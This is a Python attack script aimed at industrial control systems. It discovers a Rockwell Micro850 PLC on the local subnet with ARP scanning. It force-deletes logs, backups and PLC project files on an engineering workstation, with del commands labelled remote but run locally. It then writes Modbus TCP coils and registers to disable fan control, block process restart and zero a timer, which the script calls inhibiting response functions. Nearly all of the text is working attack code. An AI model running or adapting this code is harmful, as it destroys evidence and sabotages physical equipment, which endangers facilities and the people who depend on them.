import os
import socket
import struct
import subprocess
from scapy.all import ARP, Ether, srp

# ------------------- STEP 1: DISCOVER PLC IP ON NETWORK -------------------

def find_plc_on_network():
    """Scan the network to find Rockwell Automation Micro850 PLC."""
    network = "192.168.1.0/24"  # Modify based on actual subnet

    request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network)
    answer, _ = srp(request, timeout=2, verbose=False)
    
    for _, received in answer:
        ip = received.psrc  # Extract discovered IP
        mac = received.hwsrc

        if mac.startswith("00:E0:4C"):  # Rockwell Automation MAC Prefix
            print(f"[+] PLC found at: {ip}")
            return ip

    print("[-] No PLC detected on the network.")
    return None

# ------------------- STEP 2: DELETE FILES ON ENGINEERING WORKSTATION -------------------

def execute_remote_deletion(target_ip):
    """Delete critical logs and backups from the Engineering Workstation (EWS)."""
    # Windows commands for file deletion (executed remotely)
    commands = [
        "del C:\\Logs\\*.txt /F /S /Q",                   # Delete log files
        "del C:\\ProgramData\\Rockwell\\*.bak /F /S /Q",  # Delete backup files
        "del C:\\Automation\\PLC_Configs\\*.acd /F /S /Q" # Delete Automation project files
    ]

    for cmd in commands:
        print(f"[*] Executing: {cmd}")
        subprocess.run(["cmd.exe", "/c", cmd], shell=True)

    print("[+] Log files and PLC backups deleted successfully.")

# ------------------- STEP 3: MODIFY PLC LOGIC TO DISRUPT RESPONSE FUNCTION -------------------

def modify_plc_logic(plc_ip):
    """Use Modbus TCP to modify PLC memory variables, disabling response functions."""
    import pyModbusTCP.client  # Requires installation: `pip install pyModbusTCP`

    print("[*] Connecting to PLC at", plc_ip)
    client = pyModbusTCP.client.ModbusClient(host=plc_ip, port=502, auto_open=True)

    if not client.open():
        print("[-] Failed to connect to PLC")
        return

    print("[+] Connection established. Injecting modifications...")

    # Disrupt FAN Control (Write 0 to Activate_FanA)
    client.write_single_coil(1, False)  # Modify 'Activate_FanA' in the PLC
    client.write_single_coil(2, False)  # Modify 'START' so the process never re-initializes

    # Modify Fan Timer settings (Force PT = 0)
    client.write_single_register(5, 0)  # Set TON_1.PT to 0 (permanently disable Timer)

    print("[+] PLC logic modified successfully. Response functions are inhibited.")

    client.close()

# ------------------- MAIN EXECUTION -------------------

if __name__ == "__main__":
    plc_ip = find_plc_on_network()
    
    if plc_ip:
        execute_remote_deletion("192.168.1.100")  # Assume EWS is at this IP
        modify_plc_logic(plc_ip)
    else:
        print("[-] Exiting. No PLC found.")